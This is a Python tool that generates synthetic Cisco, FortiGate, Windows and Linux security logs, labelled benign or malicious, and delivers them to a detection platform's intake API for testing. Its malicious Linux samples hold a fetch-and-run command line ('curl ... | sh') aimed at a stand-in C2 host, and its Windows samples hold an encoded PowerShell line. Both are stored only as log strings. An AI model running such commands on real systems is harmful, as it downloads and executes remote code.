"""Replayable virtual Cisco/FortiGate/Windows/Linux device telemetry."""

import argparse
import copy
import hashlib
import http.cookiejar
import json
import os
import random
import ssl
import time
import uuid
from datetime import UTC, datetime
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlsplit
from urllib.request import HTTPCookieProcessor, HTTPRedirectHandler, HTTPSHandler, ProxyHandler, Request, build_opener

PROFILES = ("cisco_asa", "fortigate", "windows", "linux")
HOSTS = {"windows": "virtual-win-01", "linux": "virtual-linux-01", "fortigate": "FGT-VIRTUAL-01", "cisco_asa": "ASA-VIRTUAL-01"}
ATTACK_IP = "203.0.113.66"
NORMAL_IP = "198.51.100.20"


def stable_id(profile, seed, sequence):
    return hashlib.sha256(f"xsera-virtual-v1:{profile}:{seed}:{sequence}".encode()).hexdigest()


def generate(profile, count=20, *, seed=1, scenario="mixed", base_time=None):
    if profile not in PROFILES or type(count) is not int or not 1 <= count <= 100000 or type(seed) is not int or scenario not in {"benign", "attack", "mixed"}:
        raise ValueError("Bounded virtual logger profile required")
    base_time = time.time() - 120 if base_time is None else base_time
    rows, truth = [], []
    for sequence in range(count):
        malicious = scenario == "attack" or scenario == "mixed" and sequence % 5 == 0
        dest = ATTACK_IP if malicious else NORMAL_IP
        instant = base_time + sequence * .1
        identifier = stable_id(profile, seed, sequence)
        src = "10.10.0.20" if profile == "linux" else "10.10.0.10"
        port = 50000 + sequence % 1000
        if profile == "cisco_asa":
            log = f"%ASA-6-302013: Built outbound TCP connection {100000 + sequence} for outside:{dest}/443 ({dest}/443) to inside:{src}/{port} (192.0.2.10/{port})"
            item = {"id": identifier, "log": log, "event_time": instant}
        elif profile == "fortigate":
            item = {"id": identifier, "log": f'eventtime={int(instant*10**9)} devid="{HOSTS[profile]}" devname="virtual-fortigate" type="traffic" subtype="forward" level="notice" vd="root" srcip={src} srcport={port} dstip={dest} dstport=443 proto=6 action="accept" policyid=1 sessionid={100000+sequence} sentbyte=1024 rcvdbyte=512 transip=192.0.2.10 transport={port}'}
        else:
            guid = str(uuid.uuid5(uuid.NAMESPACE_OID, f"virtual:{profile}:{seed}:{sequence}"))
            process = "powershell.exe" if profile == "windows" else "bash"
            command = "powershell.exe -enc U2ltdWxhdGlvbk9ubHk=" if profile == "windows" else "curl https://c2.sim.invalid/payload.sh | sh"
            if not malicious:
                command = "powershell.exe -NoProfile Get-Date" if profile == "windows" else "/usr/bin/bash /opt/approved-health-check.sh"
            item = {"id": identifier, "data": {"@timestamp": datetime.fromtimestamp(instant, UTC).isoformat(),
                "host": {"id": HOSTS[profile], "name": HOSTS[profile], "os": {"type": profile}},
                "process": {"guid": guid, "pid": 10000+sequence, "start_identity": f"virtual:{seed}:{sequence}", "name": process,
                            "executable": "C:\\VirtualLab\\powershell.exe" if profile == "windows" else "/usr/bin/bash",
                            "command_line": command, "parent": {"guid": "virtual-parent-" + profile, "name": "services.exe" if profile == "windows" else "systemd"}},
                "user": {"name": "virtual-user"}, "source": {"ip": src, "port": port}, "destination": {"ip": dest, "port": 443},
                "network": {"protocol": "tcp"}, "event": {"action": "process_created", "module": "process", "severity": "info"},
                "agent": {"collector": "xsera-virtual-python", "simulation": True, "native_sensor_collected": False}}}
        rows.append(item)
        truth.append({"source_event_id": identifier, "profile": profile, "scenario_label": "malicious" if malicious else "benign", "expected_dest_ip": dest})
    return rows, truth


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


class Transport:
    def __init__(self, origin, user, password, ca=None):
        url = urlsplit(origin)
        if url.scheme not in {"http", "https"} or not url.hostname or url.username or url.password or url.path not in {"", "/"} or url.query or url.fragment:
            raise ValueError("Use an origin without credentials/path/query")
        if url.scheme == "http" and url.hostname not in {"127.0.0.1", "localhost", "::1"}:
            raise ValueError("Remote simulation delivery requires verified HTTPS")
        self.origin = origin.rstrip("/")
        self.csrf = None
        context = ssl.create_default_context(cafile=str(ca) if ca else None)
        self.opener = build_opener(NoRedirect(), ProxyHandler({}), HTTPCookieProcessor(http.cookiejar.CookieJar()), HTTPSHandler(context=context))
        reply = self.post("/api/login", {"name": user, "password": password})
        self.csrf = reply["csrf"]

    def post(self, path, data):
        return self.send(path, data)

    def get(self, path):
        return self.send(path, None)

    def send(self, path, data):
        headers = {"Content-Type": "application/json", "Origin": self.origin}
        if self.csrf:
            headers["X-CSRF-Token"] = self.csrf
        request = Request(self.origin + path, data=json.dumps(data, allow_nan=False).encode() if data is not None else None, headers=headers)
        for attempt in range(5):
            try:
                with self.opener.open(request, timeout=15) as response:
                    body = response.read(2 * 1024 * 1024 + 1)
                    if len(body) > 2 * 1024 * 1024:
                        raise ValueError("Simulation response budget exceeded")
                    return json.loads(body)
            except HTTPError as exc:
                if exc.code not in {429, 503} or attempt == 4:
                    raise
                time.sleep(min(2**attempt, 8))

    def deliver(self, source_id, source_version, events, cursor, checkpoint_version=0):
        result = self.post("/api/v2/sources/" + source_id + "/intake", {"version": source_version, "events": events, "cursor": cursor, "checkpoint_version": checkpoint_version})
        if result.get("durable") is not True or result.get("cursor_committed") is not True:
            raise ValueError("Simulation source has no durable acknowledgment")
        return result


def main(profile=None):
    parser = argparse.ArgumentParser(description=__doc__)
    if profile is None:
        parser.add_argument("--profile", choices=PROFILES, required=True)
    parser.add_argument("--origin", required=True)
    parser.add_argument("--source-id", required=True)
    parser.add_argument("--source-version", type=int, default=1)
    parser.add_argument("--checkpoint-version", type=int, default=0)
    parser.add_argument("--user-env", default="SAPIENTIA_SIM_USER")
    parser.add_argument("--password-env", default="SAPIENTIA_SIM_PASSWORD")
    parser.add_argument("--ca", type=Path)
    parser.add_argument("--count", type=int, default=20)
    parser.add_argument("--seed", type=int, default=1)
    parser.add_argument("--scenario", choices=("benign", "attack", "mixed"), default="mixed")
    parser.add_argument("--base-time", type=float, required=True)
    parser.add_argument("--interval", type=float, default=0)
    parser.add_argument("--batch-size", type=int, default=50)
    parser.add_argument("--shuffle", action="store_true")
    parser.add_argument("--repeat", type=int, default=1)
    args = parser.parse_args()
    profile = profile or args.profile
    if not 1 <= args.batch_size <= 1000 or not 1 <= args.repeat <= 10 or not 0 <= args.interval <= 60:
        parser.error("Invalid bounded batch/repeat/interval")
    user, password = os.environ.get(args.user_env), os.environ.get(args.password_env)
    if not user or not password:
        parser.error("Set private simulation login environment references")
    events, _truth = generate(profile, args.count, seed=args.seed, scenario=args.scenario, base_time=args.base_time)
    if args.shuffle:
        random.Random(args.seed).shuffle(events)
    transport = Transport(args.origin, user, password, args.ca)
    accepted = duplicate = 0
    checkpoint = args.checkpoint_version
    for start in range(0, len(events), args.batch_size):
        batch = events[start:start+args.batch_size]
        cursor = f"virtual:{profile}:{args.seed}:{start+len(batch)}"
        original_version = checkpoint
        for attempt in range(args.repeat):
            ack = transport.deliver(args.source_id, args.source_version, batch, cursor, original_version)
            accepted += ack["accepted"]
            duplicate += ack["duplicate"]
            checkpoint = ack["checkpoint_version"]
        if args.interval:
            time.sleep(args.interval)
    print(json.dumps({"profile": profile, "accepted": accepted, "duplicates": duplicate, "checkpoint_version": checkpoint,
                      "synthetic": True, "native_sensor_collected": False, "host_effects_executed": False}))


if __name__ == "__main__":
    main()
